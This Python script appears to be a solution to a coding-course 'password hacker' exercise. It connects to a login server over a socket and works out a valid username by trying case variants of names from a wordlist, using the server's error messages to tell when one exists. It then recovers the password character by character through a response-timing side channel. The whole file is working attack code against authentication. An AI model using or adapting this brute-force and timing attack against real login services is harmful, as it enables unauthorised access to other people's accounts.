import json
import socket
import time
import sys
import itertools
from pathlib import Path

characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
main_dir = Path(__file__).parent.parent.absolute()
with open(Path(main_dir, 'logins.txt')) as f:
    logins = f.read().splitlines()


def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])
    address = (ip, port)
    with socket.socket() as client:
        client.connect(address)
        login = find_login(client)
        password = find_password(client, login)
    print(format_json(login, password))


def find_login(client):
    for login in logins:
        for candidate_login in generate_possible_words(login):
            data = format_json(candidate_login, ' ')
            response = send_data(client, data)
            if json.loads(response)['result'] == "Wrong password!":
                return candidate_login


def find_password(client, login):
    password = ''
    while True:
        password = find_next_char(client, login, password)
        if type(password) == list:
            return ''.join(password)


def find_next_char(client, login, password):
    for char in characters:
        data = format_json(login, password + char)
        start = time.time()
        response = send_data(client, data)
        end = time.time()
        if json.loads(response)['result'] == "Connection success!":
            return list(password + char)
        elif end - start >= 0.1:
            return password + char


def generate_possible_words(word):
    index_letters = [i for i in range(len(word)) if word[i].isalpha()]
    combinations = itertools.product(range(2), repeat=len(index_letters))
    for combination in combinations:
        for i, index in enumerate(index_letters):
            if combination[i] == 1:
                word = word[:index] + word[index].upper() + word[index + 1:]
            else:
                word = word[:index] + word[index].lower() + word[index + 1:]
        yield word


def format_json(login, password):
    """Converts to JSON in order to send to the server"""
    return json.dumps({'login': login, 'password': password})


def send_data(socket_client, json_data):
    socket_client.send(json_data.encode())
    try:
        server_response = socket_client.recv(1024).decode()
    except ConnectionError:
        return 'Connection error!'
    return server_response


if __name__ == '__main__':
    main()
